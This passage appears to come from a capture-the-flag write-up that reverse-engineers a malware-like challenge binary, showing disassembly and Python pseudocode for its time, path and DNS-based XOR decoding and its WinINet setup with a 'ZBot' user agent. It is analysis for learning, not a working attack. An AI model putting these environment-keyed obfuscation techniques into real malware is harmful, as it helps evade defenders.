</span><span class='line'><span class="nl">tm_year:</span>    <span class="n">Year</span> <span class="p">(</span><span class="n">current</span> <span class="n">year</span> <span class="n">minus</span> <span class="mi">1900</span><span class="p">).</span>
</span><span class='line'><span class="nl">tm_wday:</span>    <span class="n">Day</span> <span class="n">of</span> <span class="n">week</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">6</span><span class="p">;</span> <span class="n">Sunday</span> <span class="o">=</span> <span class="mi">0</span><span class="p">).</span>
</span><span class='line'><span class="nl">tm_yday:</span>    <span class="n">Day</span> <span class="n">of</span> <span class="n">year</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">365</span><span class="p">;</span> <span class="n">January</span> <span class="mi">1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">).</span>
</span><span class='line'><span class="nl">tm_isdst:</span>   <span class="n">Positive</span> <span class="n">value</span> <span class="k">if</span> <span class="n">daylight</span> <span class="n">saving</span> <span class="n">time</span> <span class="n">is</span> <span class="n">in</span> <span class="n">effect</span><span class="p">;</span> <span class="mi">0</span> <span class="k">if</span> <span class="n">daylight</span> <span class="n">saving</span> <span class="n">time</span> <span class="n">is</span> <span class="n">not</span> <span class="n">in</span> <span class="n">effect</span><span class="p">;</span> <span class="n">negative</span> <span class="n">value</span> <span class="k">if</span> <span class="n">status</span> <span class="n">of</span> <span class="n">daylight</span> <span class="n">saving</span> <span class="n">time</span> <span class="n">is</span> <span class="n">unknown</span><span class="p">.</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>If time check passes, blob is xor-ed with <code>\x01\x02\x03\x05\x00\x78\x30\x38\x0d</code> otherwise it will be xor-ed with <code>\x07\x77</code>.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Hour check </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">Hour</span> <span class="o">==</span> <span class="mi">17</span><span class="p">)):</span>   <span class="c"># Between 5 and 6 PM</span>
</span><span class='line'>    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="err">”</span>\<span class="n">x01</span>\<span class="n">x02</span>\<span class="n">x03</span>\<span class="n">x05</span>\<span class="n">x00</span>\<span class="n">x78</span>\<span class="n">x30</span>\<span class="n">x38</span>\<span class="n">x0d</span><span class="err">”</span><span class="p">)</span>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="err">”</span>\<span class="n">x07</span>\<span class="n">x77</span><span class="err">”</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h3 id="interlude---12---fullpath-xor">Interlude - 12 - Fullpath xor</h3>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">BackDoge</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">IPCheck</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">HourCheck</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B4C</span> <span class="nv">mov</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="nb">bl</span><span class="nv">ob_length</span> <span class="c1">; you are here</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B52</span> <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B54</span> <span class="nv">xor</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B56</span> <span class="nv">test</span>    <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B58</span> <span class="nv">jz</span>      <span class="nv">short</span> <span class="nv">loc</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401</span><span class="nv">B83</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B5A</span> <span class="nv">lea</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebx</span><span class="o">+</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B60</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B60</span> <span class="nv">loc</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401</span><span class="nv">B60</span><span class="p">:</span>                             <span class="c1">; CODE XREF: .text:00401B81j</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B60</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mh">0AAAAAAABh</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B65</span> <span class="nv">mul</span>     <span class="nb">ecx</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B67</span> <span class="nv">shr</span>     <span class="nb">edx</span><span class="p">,</span> <span class="mi">3</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B6A</span> <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span><span class="o">+</span><span class="nb">edx</span><span class="o">*</span><span class="mi">2</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B6D</span> <span class="nv">add</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B6F</span> <span class="nv">add</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B71</span> <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="nb">ecx</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B73</span> <span class="nv">sub</span>     <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B75</span> <span class="nv">mov</span>     <span class="nb">al</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span><span class="o">+</span><span class="nb">edi</span><span class="p">]</span>    <span class="c1">; Moving full path to al by character</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B78</span> <span class="nv">xor</span>     <span class="nb">bl</span><span class="nv">ob</span><span class="p">[</span><span class="nb">ecx</span><span class="p">],</span> <span class="nb">al</span>    <span class="c1">; xor-ing full path with blob</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B7E</span> <span class="nv">inc</span>     <span class="nb">ecx</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B7F</span> <span class="nv">cmp</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ebx</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B81</span> <span class="nv">jb</span>      <span class="nv">short</span> <span class="nv">loc</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401</span><span class="nv">B60</span> <span class="c1">; jump back up to xor the next char</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B83</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B83</span> <span class="nv">loc</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401</span><span class="nv">B83</span><span class="p">:</span>                             <span class="c1">; CODE XREF: .text:00401B58j</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B83</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4017</span><span class="nv">A0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B88</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4018</span><span class="nv">A0</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>We finished the first 10 functions, YAY. Now we see that the full path of binary is xor-ed with the blob. However, <strong>keep in mind that one of the checks compared full path with <code>backdoge.exe</code></strong>.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Fullpath xor </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span> <span class="n">fullpath</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h3 id="function-13---internet-rootz">Function 13 - Internet Rootz</h3>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B83</span> <span class="nv">loc</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401</span><span class="nv">B83</span><span class="p">:</span>                             <span class="c1">; CODE XREF: .text:00401B58j</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B83</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4017</span><span class="nv">A0</span>       <span class="c1">; you are here</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B88</span> <span class="nv">call</span>    <span class="nv">sub_4018A0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B8D</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B90</span> <span class="nv">movzx</span>   <span class="nb">edx</span><span class="p">,</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ecx</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B93</span> <span class="nv">mov</span>     <span class="nb">bl</span><span class="nv">ob</span><span class="p">,</span> <span class="nb">dl</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Two more functions. We’re getting there.</p>

<p><img src="/images/2014/flare/7-19.jpg" alt="Fetching IP for e.root-servers.net" title="Fetching IP for e.root-servers.net" /></p>

<p>We have seen this type of code. This function pushes <code>e.root-servers.net</code> to stack and then calls <code>gethostbyname</code> to retrieve its IP <code>192.203.230.10</code>. If the result is not zero, <code>h_addrtype</code> is checked for 2 (<code>AF_INET</code>) and retrieved IP is converted into ASCII format.</p>

<p><img src="/images/2014/flare/7-20.jpg" alt="xor-ing IP with blob" title="xor-ing IP with blob" /></p>

<p>The rest is pretty simple. <code>192.203.230.10</code> is xor-ed with the blob.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Fullpath xor </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="err">”</span><span class="mf">192.203</span><span class="o">.</span><span class="mf">230.10</span><span class="err">”</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h3 id="function-14---jackrat">Function 14 - jackRAT</h3>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B83</span> <span class="nv">loc</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401</span><span class="nv">B83</span><span class="p">:</span>                             <span class="c1">; CODE XREF: .text:00401B58j</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B83</span> <span class="nv">call</span>    <span class="nv">InternetRootz</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B88</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4018</span><span class="nv">A0</span>       <span class="c1">; you are here</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B8D</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B90</span> <span class="nv">movzx</span>   <span class="nb">edx</span><span class="p">,</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ecx</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B93</span> <span class="nv">mov</span>     <span class="nb">bl</span><span class="nv">ob</span><span class="p">,</span> <span class="nb">dl</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>sub_4018A0 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="err">&lt;/</span><span class="nf">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">004018</span><span class="nv">A0</span> <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4018</span><span class="nv">A0</span> <span class="nv">proc</span> <span class="nv">near</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">A0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">A0</span> <span class="nv">push</span>    <span class="nb">ebp</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">A1</span> <span class="nv">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">A3</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mh">1088h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">A8</span> <span class="nv">call</span>    <span class="nv">__alloca_probe</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">AD</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nv">___security_cookie</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">B2</span> <span class="nv">xor</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">ebp</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">B4</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4</span><span class="p">],</span> <span class="nb">eax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">B7</span> <span class="nv">push</span>    <span class="nb">ebx</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">B8</span> <span class="nv">xor</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">BA</span> <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; dwFlags - 0x00</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">BB</span> <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; lpszProxyBypass - 0x00</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">BC</span> <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; lpszProxy - 0x00</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">BD</span> <span class="nv">push</span>    <span class="mi">1</span>               <span class="c1">; dwAccessType - INTERNET_OPEN_TYPE_DIRECT</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">BD</span>                         <span class="c1">; Meaning direct access</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">BF</span> <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">szAgent</span>  <span class="c1">; “ZBot”</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">C4</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">InternetOpenW</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">CA</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">1088</span><span class="p">],</span> <span class="nb">eax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">D0</span> <span class="nv">cmp</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">ebx</span>          <span class="c1">; If a NULL handle is returned (no internet connectivity) exit</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">D2</span> <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4018</span><span class="nv">E5</span>  <span class="c1">; otherwise jump to loc&lt;em&gt;4018E5</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">D4</span> <span class="nv">xor</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">D6</span> <span class="nv">pop</span>     <span class="nb">ebx</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">D7</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">DA</span> <span class="nv">xor</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ebp</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">DC</span> <span class="nv">call</span>    <span class="err">@</span><span class="nv">__security_check_cookie@4</span> <span class="c1">; __security_check_cookie(x)</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">E1</span> <span class="nv">mov</span>     <span class="nb">esp</span><span class="p">,</span> <span class="nb">ebp</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">E3</span> <span class="nv">pop</span>     <span class="nb">ebp</span>             <span class="c1">; exit if NULL handle was retured</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">E4</span> <span class="nv">ret</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>We see <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096%28v=vs.85%29.aspx">InternetOpen</a> called. This function initialises the WinINet functions. Agent name is <code>ZBot</code> which is an alternate name for the <code>Zeus</code> trojan horse. Access type is <code>INTERNET_OPEN_TYPE_DIRECT</code> which means direct access without the use of any proxies. If a NULL handle is returned then function will exit (line 28). If not it will jump to <code>loc_4018E5</code> (line 21).</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>loc 4018E5 - InternetOpenUrl </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">E5</span> <span class="nv">loc</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4018</span><span class="nv">E5</span><span class="p">:</span>             <span class="c1">; dwContext</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">E5</span> <span class="nv">push</span>    <span class="nb">ebx</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">E6</span> <span class="nv">push</span>    <span class="mh">400100h</span>         <span class="c1">; dwFlags</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">EB</span> <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; dwHeadersLength - 0x00</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">EC</span> <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; lpszHeaders - 0x00</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">ED</span> <span class="nv">lea</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">szUrl</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">F0</span> <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; lpszUrl</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">F1</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; hInternet - Handle from previous InternetOpen</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">F2</span> <span class="nv">mov</span>     <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">szUrl</span><span class="p">],</span> <span class="mh">740068h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004018</span><span class="nf">F9</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">78</span><span class="p">],</span> <span class="mh">700074h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401900</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">74</span><span class="p">],</span> <span class="mh">3A0073h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401907</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">70</span><span class="p">],</span> <span class="mh">2F002Fh</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0040190</span><span class="nf">E</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">6</span><span class="nv">C</span><span class="p">],</span> <span class="mh">770074h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401915</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">68</span><span class="p">],</span> <span class="mh">740069h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0040191</span><span class="nf">C</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">64</span><span class="p">],</span> <span class="mh">650074h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401923</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">60</span><span class="p">],</span> <span class="mh">2E0072h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0040192</span><span class="nf">A</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">5</span><span class="nv">C</span><span class="p">],</span> <span class="mh">6F0063h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401931</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">58</span><span class="p">],</span> <span class="mh">2F006Dh</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401938</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">54</span><span class="p">],</span> <span class="mh">690046h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0040193</span><span class="nf">F</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">50</span><span class="p">],</span> <span class="mh">650072h</span>
